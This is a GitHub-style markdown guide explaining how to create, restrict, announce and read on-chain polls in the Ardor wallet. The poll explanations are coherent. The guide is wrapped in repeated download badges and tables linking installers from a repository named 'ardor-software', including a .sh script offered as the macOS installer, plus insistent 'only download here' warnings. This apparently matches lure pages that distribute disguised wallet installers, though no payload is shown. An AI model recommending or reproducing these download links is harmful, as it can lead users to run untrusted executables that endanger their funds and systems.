![Ardor Wallet guide](assets/banner-article.png)

# Create a poll and vote in the Ardor wallet

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

A poll on Ardor is an on-chain vote: you publish a question with a set of named options, accounts vote by transaction, and the tally is recorded in the chain for anyone to read. Polls can be open to every account or restricted to the holders of a specific asset.

## What a poll is

It is a transaction with a question, a list of options and a voting model. Once confirmed, it exists on the [Ardor chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md) and cannot be quietly edited, which is the property that makes it useful: the question, the options and the rule for counting are all fixed before the first vote.

That is a different thing from a poll on a website, where the operator can change the options or the tally afterwards. Here the operator is the chain, and the record is the argument.

## Creating one

1. Unlock the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) and pick the chain where the poll will run.
2. Open the voting section and create a poll.
3. Write the question so it can be answered by choosing one option, and name each option briefly.
4. Choose the voting model: one [account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) one vote, or weight by holdings.
5. Set the duration and confirm the transaction, paying the fee.
6. Publish the poll's identifier so the people you are asking can find it.

Step three decides whether the result means anything. A question with overlapping options produces a tally that cannot be interpreted, and the chain will not help with that.

## How votes are counted

The two common models answer different questions. One account one vote suits a community decision where each participant counts equally. Weighting by holdings suits a decision about a treasury or an asset, where the people with more at stake carry more influence.

Whichever model is chosen, it is set at creation. A poll cannot switch from one to the other after votes have been cast, which prevents the operator from changing the rules once the result is visible.

## Restricting a poll to asset holders

A poll can be limited to the holders of a specific asset, so that only those accounts can vote. That is the mechanism behind [token](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-ardor-token-does.md)-gated voting: ownership of the asset is the eligibility check, and the chain enforces it without a separate register.

The practical consequence is that eligibility is visible and auditable. Anyone can see which accounts held the asset at the time, and the poll's restriction is part of its record rather than a promise about who was invited.

## Choosing a voting model

If the outcome should reflect people, count accounts. If it should reflect stake, weight by holdings. The mistake is choosing the second while describing the poll as if it were the first.

A weighted poll on a concentrated asset can be decided by one holder, which may be exactly right for a treasury decision and entirely wrong for a community question. Decide which question you are asking before you pick the rule.

## Announcing a poll

A poll needs an audience before it needs a result. Publish the identifier in the places the participants already read, and repeat the closing time, because a vote that closes before people notice is a vote that measured nothing.

If the poll is restricted to asset holders, say so in the announcement rather than leaving people to discover it when they try to vote. The restriction is visible on chain, but it is not visible to someone who has not looked.

## Reading the results

Results are read from the poll's record: the votes cast, the weight behind each option and the time the poll closes. Because it is on chain, two people reading it see the same numbers, which is the point of putting a vote there at all.

Votes are public by default. That is worth understanding before participating, since a vote is a transaction from your account and anyone can see which option it selected.

## What a poll does not do

It does not execute anything. A poll that passes does not move funds, change a setting or trigger a payment; it records that a group of accounts expressed a preference. Turning that preference into an action is a separate transaction, made by whoever controls the account that acts.

That gap is where on-chain governance gets interesting and where expectations often run ahead of the mechanism. The vote is evidence; the execution is a decision somebody still has to make.

## Running a poll people answer

Set a duration long enough for the people you are asking to notice, and short enough that the question stays relevant. Publish the poll's identifier where those people already are, because a poll nobody sees produces a result that proves nothing.

If the poll is weighted, say so in the question text. A participant who assumes one account one vote and discovers the weighting afterwards will distrust the result, and rightly.

## FAQ

### Can votes be changed after casting?

A vote is a transaction. Whether it can be replaced depends on the poll's model, so check before voting if you are unsure.

### Are poll votes private?

No. Votes are public on chain, including which account cast them and which option was chosen.

### Can I restrict voting to asset holders?

Yes. A poll can be limited to the holders of a specific asset, which makes ownership the eligibility rule.

### Does a passed poll take effect automatically?

No. The result is a record. Acting on it requires a separate transaction from the account that controls the thing being decided.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Issue an asset or a custom currency on Ardor, and trade it](https://github.com/ardor-software/ardor-platform-guides/blob/main/issue-and-trade-assets-on-ardor.md)
- [Ardor aliases and account properties explained](https://github.com/ardor-software/ardor-wallet-guides/blob/main/ardor-aliases-and-account-properties.md)
- [Sell on the Ardor marketplace](https://github.com/ardor-software/ardor-platform-guides/blob/main/sell-on-the-ardor-marketplace.md)
- [Trade on the Ardor coin exchange](https://github.com/ardor-software/ardor-platform-guides/blob/main/trade-on-the-ardor-coin-exchange.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
